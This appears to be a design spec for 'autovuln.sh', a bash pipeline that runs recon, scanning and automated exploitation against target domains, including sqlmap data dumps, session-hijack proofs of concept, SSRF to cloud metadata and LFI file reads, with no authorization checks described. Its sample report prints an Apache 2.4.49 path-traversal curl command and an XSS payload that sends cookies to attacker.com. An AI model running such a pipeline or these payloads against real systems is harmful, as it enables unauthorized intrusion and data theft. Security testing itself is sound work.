# autovuln.sh — Smart Autonomous Vulnerability Pipeline

## Overview

Single bash script (`autovuln.sh`) that runs a complete end-to-end vulnerability assessment pipeline on a target domain. Takes one command, produces a consolidated findings report with exploit code references. No Claude/token interaction required between steps.

## Usage

```bash
./autovuln.sh target.com            # Full pipeline on single target
./autovuln.sh target.com --quick    # Skip deep exploitation
./autovuln.sh targets.txt           # Batch: one domain per line in file
./autovuln.sh target.com --aggressive  # Enable destructive tests (POST/PUT/DELETE)
```

## Pipeline Phases

### Phase 0 — Pre-flight
- Check all required tools exist (subfinder, httpx, nuclei, dalfox, etc.)
- Validate target format (domain or file)
- Determine parallel thread count from `nproc` (CPU cores)
- Create output directory: `recon/<target>/`
- Start interactsh-client for OOB detection

### Phase 1 — Reconnaissance

All outputs go to `recon/<target>/`.

| Step | Tool | Output | Parallelism |
|------|------|--------|-------------|
| 1a | subfinder + chaos | `subdomains.txt` | Both run concurrently, results merged |
| 1b | dnsx | `resolved.txt` | Batch resolve in chunks |
| 1c | httpx (tech/status/title) | `live-hosts.txt`, `tech-stack.txt` | Parallel per resolved host |
| 1d | nmap top-1000 | `nmap.txt` | On unique IPs |
| 1e | katana deep crawl | `urls.txt` | On live hosts |
| 1f | gau + waybackurls | `urls.txt` (appended) | Both run concurrently |
| 1g | unfurl + gf | `params.txt`, `*-candidates.txt` | Classify by bug class |
| 1h | subjack | `takeovers.txt` | CNAME takeover check |
| 1i | gowitness | `screenshots/` | Screenshot all live hosts |

**Parallel processing**: Discovered subdomains split into batches based on `nproc`. Tool calls use `xargs -P $THREADS`. As new subdomains are discovered, they're fed back into httpx probing progressively.

### Phase 2 — Analysis & Exploit Cross-Reference

Reads all Phase 1 output to build a dynamic scan plan and cross-reference against 47K exploit database.

**Tech → Exploit matching**: For each tech+version detected by httpx, grep the exploit-db CSV for matching descriptions. Example:
- `Apache 2.4.49` → `grep "Apache.*2.4.49" files_exploits.csv` → EDB-50383 (Path Traversal & RCE)
- `WordPress 4.6` → `grep "WordPress.*4.6" files_exploits.csv` → EDB-41962 (RCE)

**WAF detection**: Run wafw00f on each live host. If WAF detected (Cloudflare, ModSecurity, etc.), note it for Phase 3 to use WAF-specific bypass payloads.

**JS analysis**: Download all JS files from live hosts, grep for:
- API keys and secrets
- Internal/hidden endpoints
- postMessage handlers
- GraphQL/AWS/Stripe patterns

**Subdomain takeover**: Parse subjack output for any takeovers.

**CORS testing**: Quick curl with `Origin: https://evil.com` on all live hosts.

**Hunt plan generation**: Sets decision flags:

| Flag | Trigger | Action |
|------|---------|--------|
| `DO_NUCLEI` | Always | Run nuclei templates |
| `DO_DALFOX` | xss-candidates.txt non-empty | Run dalfox XSS scan |
| `DO_SQLMAP` | sqli-candidates.txt non-empty | Run sqlmap batch |
| `DO_FFUF` | Always | Directory fuzzing on live hosts |
| `DO_SSRF` | ssrf-candidates.txt non-empty | SSRF probe with interactsh |
| `DO_LFI` | lfi-candidates.txt non-empty | LFI payload testing |
| `DO_API` | api-endpoints.txt non-empty | API-specific nuclei + fuzzing |
| `DO_WPSCAN` | tech-stack includes WordPress | Run wpscan |
| `DO_GRAPHQL` | tech-stack includes GraphQL | GraphQL introspection + depth testing |
| `DO_NEXTJS` | tech-stack includes Next.js | Next.js SSRF + path traversal |
| `DO_SPRING` | tech-stack includes Spring | Spring Boot actuator checks |
| `DO_LARAVEL` | tech-stack includes Laravel | Laravel debug + .env checks |
| `DO_RAILS` | tech-stack includes Rails | Rails mass assignment |

Also generates a **priority queue** of endpoints sorted by risk score:
- More parameters = higher score
- Rarer tech stack = higher score
- Auth-required endpoints = higher score
- Known exploit in DB = highest score

### Phase 3 — Vulnerability Scanning

Runs tools based on Phase 2 flags. Execution order by impact potential:

1. **Nuclei** — severity critical,high,medium against all live hosts. If WAF detected, include WAF-specific templates.
2. **CORS** — confirmed via curl, document findings.
3. **Dalfox** — on XSS candidates. Use WAF-specific payloads if applicable.
4. **SQLMap** — on SQLi candidates (`--batch --risk=2 --level=3 --random-agent`).
5. **FFuf** — cascade: common.txt → raft-medium.txt → api-endpoints.txt. Per host type.
6. **Tech-specific** — WordPress, GraphQL, Next.js, Spring, Laravel, Rails per flags.
7. **SSRF** — auto-start interactsh-client, inject callback URLs, monitor for hits.
8. **LFI** — payload sequence: `/etc/passwd`, `php://filter`, `/proc/self/environ`.
9. **API** — nuclei API templates + ffuf API wordlist on discovered API endpoints.
10. **Content discovery cascade** — multiple wordlists with increasing coverage.

**Progressive targeting**: If any tool finds a vulnerability on a specific endpoint, that endpoint is promoted to the deep exploitation queue for Phase 4.

### Phase 4 — Deep Exploitation

Only triggers if Phase 3 produced confirmed findings. Each deep exploit has a timebox:

| Trigger | Action | Timebox |
|---------|--------|---------|
| SQLi confirmed | sqlmap --dump --batch on exact endpoint | 10 min |
| XSS confirmed | Blind XSS via interactsh + session hijack PoC | 5 min |
| SSRF confirmed | Cloud metadata (169.254.x.x), internal port scan | 5 min |
| LFI confirmed | Read /etc/passwd, /proc/self/environ, source code | 5 min |
| API creds found | Test against authenticated endpoints | 5 min |
| Subdomain takeover | Register PoC or document proof | 3 min |
| CORS misconfig | Build proof-of-concept HTML page | 3 min |

### Phase 5 — Report Generation

Aggregates all findings into `recon/<target>/FINDINGS.md`:

```markdown
# TARGET: target.com
# Date: 2026-05-19
# Duration: 45 minutes

## Severity Breakdown
- Critical: 2
- High: 3
- Medium: 5
- Low: 2

## Findings

### CRITICAL: CVE-2021-41773 — Apache 2.4.49 Path Traversal → RCE
- **Tool:** nuclei / httpx
- **Endpoint:** https://sub.target.com/
- **Tech:** Apache 2.4.49
- **Exploit:** ~/cvekb/exploitdb/exploits/multiple/webapps/50383.sh
- **PoC:** `curl -s --path-as-is "https://sub.target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"`
- **Exploit Reference:** EDB-50383 — Path Traversal & RCE

### HIGH: Stored XSS in profile name
- **Tool:** dalfox
- **Endpoint:** https://app.target.com/profile
- **Parameter:** name
- **PoC:** `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`

### MEDIUM: CORS Misconfiguration
- **Tool:** curl
- **Endpoint:** https://api.target.com/users
- **Detail:** Reflects Origin header with wildcard

### Attack Chain Suggestions
- [Apache RCE] → [SSRF to internal] → [Cloud metadata exfil] — Critical
```

If critical findings found, sends notification via `notify` CLI (Telegram/Discord/webhook configured in `~/.notify/`).

## Exploit Database Integration

### Lookup function
```bash
# By keyword (tech/version)
exploit_by_keyword "Apache 2.4.49"
→ EDB-50383 | exploits/multiple/webapps/50383.sh | Path Traversal & RCE

# By CVE
exploit_by_cve "CVE-2021-41773"
→ EDB-50383 | exploits/multiple/webapps/50383.sh | Path Traversal & RCE

# By platform
exploit_by_platform "linux" "webapps"
→ All web exploits for Linux
```

### Data sources
- CSV: `/home/ryasr/cvekb/files_exploits.csv` (47K entries)
- SQLite: `/home/ryasr/cvekb/cvekb.db` (exploitdb_raw table)
- Exploit code: `/home/ryasr/cvekb/exploitdb/exploits/`

## Parallelization Strategy

- `THREADS=$(nproc --all 2>/dev/null || sysctl -n hw.ncpu 2>/dev/null || echo 4)`
- Subdomain enumeration: 4 parallel workers for batch processing
- HTTP probing: `xargs -P $THREADS` for httpx
- URL crawling: multi-goroutine katana
- Tool phases: serial between tools (avoid resource contention), parallel within tools
- Multi-target: process sequentially (one at a time, full pipeline per target)

## Resource Limits

- Phase 0-1 (recon): Unlimited (fastest possible)
- Phase 3 (scan): Rate limited at 1 req/sec default, configurable via flag
- Phase 4 (exploit): Timeboxed per exploit type
- nmap: `--min-rate 500` (network depends)
- sqlmap: `--delay 1` to avoid WAF/DoS triggers

## Safety

- `--aggressive` flag required for POST/PUT/DELETE requests
- No automated account registration or credential stuffing
- sqlmap `--batch` avoids interactive prompts, `--flush-session` for fresh runs
- All requests logged to `recon/<target>/request-log.txt`

## Files Created

```
recon/<target>/
├── subdomains.txt        # All discovered subdomains
├── resolved.txt          # DNS-resolved IPs
├── live-hosts.txt        # Live hosts with status/title/tech
├── tech-stack.txt        # Detected technologies per host
├── urls.txt              # All crawled URLs
├── params.txt            # Extracted parameter names
├── xss-candidates.txt    # GF-classified XSS URLs
├── sqli-candidates.txt   # GF-classified SQLi URLs
├── ssrf-candidates.txt   # GF-classified SSRF URLs
├── lfi-candidates.txt    # GF-classified LFI URLs
├── redirect-candidates.txt # GF-classified redirect URLs
├── api-endpoints.txt     # API paths
├── takeovers.txt         # Subdomain takeover candidates
├── nmap.txt              # Nmap scan output
├── nuclei.txt            # Nuclei findings
├── dalfox.txt            # Dalfox XSS findings
├── sqlmap/               # SQLMap output directory
├── ffuf/                 # FFuf output directory
├── screenshots/          # Gowitness screenshots
├── cors.txt              # CORS test results
├── js-findings.txt       # JS bundle analysis results
├── exploit-refs.txt      # Exploit-db cross-references
├── request-log.txt       # All outgoing requests log
├── hunt-plan.txt         # Generated scan plan (flags)
└── FINDINGS.md           # Final report
```

## Dependencies

All pre-installed in the environment:
- Go: subfinder, httpx, nuclei, ffuf, dalfox, gau, katana, gowitness, subjack, unfurl, gf, qsreplace, anew, dnsx, interactsh-client, notify, waybackurls, wafw00f
- Python: sqlmap
- System: nmap, curl
- Database: ~/cvekb/ (exploit-db CSV + SQLite)
